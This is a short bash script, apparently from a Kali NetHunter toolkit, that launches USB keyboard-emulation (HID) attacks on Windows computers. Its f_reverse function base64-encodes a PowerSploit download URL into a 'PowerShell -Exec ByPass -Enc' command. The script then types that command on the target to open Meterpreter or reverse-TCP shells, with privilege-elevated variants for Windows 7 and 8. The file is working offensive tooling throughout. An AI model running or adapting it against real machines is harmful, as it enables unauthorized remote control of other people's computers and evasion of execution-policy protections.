#!/bin/bash
# $1 = Is an argument passed by /system/bin/bootkali (e.g. bootkali start-rev-met english)
# $2 = Is an argument passed by /system/bin/bootkali to set the language --us | --fr | --de | --es

if [ "$1" == "hid-cmd" ]; then
	LANG=$LANG /usr/bin/hid-all.py --wincmd $2
fi
if [ "$1" == "hid-cmd-elevated-win8" ]; then
	LANG=$LANG /usr/bin/hid-all.py --win8cmd $2
fi
if [ "$1" == "hid-cmd-elevated-win7" ]; then
	LANG=$LANG /usr/bin/hid-all.py --win7cmd $2
fi

# REVERSE COMMANDS

f_reverse(){
encode="`cat /sdcard/files/powersploit-url | /usr/bin/iconv --to-code UTF-16LE | /usr/bin/base64 -w 0`"
command=" PowerShell.exe -Exec ByPass -Nol -Enc $encode"
echo " $command" >/sdcard/files/rev-met
}

if [ "$1" == "start-rev-met" ]; then
	f_reverse
	LANG=$LANG /usr/bin/hid-all.py --win8_met $2
fi
if [ "$1" == "start-rev-met-elevated-win7" ]; then
	f_reverse
	LANG=$LANG /usr/bin/hid-all.py --win7cmd $2
fi
if [ "$1" == "start-rev-met-elevated-win8" ]; then
	f_reverse
	LANG=$LANG /usr/bin/hid-all.py --win8cmd $2
fi
if [ "$1" == "start-rev-tcp-elevated-win7" ]; then
	f_reverse
	LANG=$LANG /usr/bin/hid-all.py --revtcpwin7 $2
fi
if [ "$1" == "start-rev-tcp-elevated-win8" ]; then
	f_reverse
	LANG=$LANG /usr/bin/hid-all.py --revtcpwin8 $2
fi
if [ "$1" == "start-rev-tcp" ]; then
	f_reverse
	LANG=$LANG /usr/bin/hid-all.py --revtcp $2
fi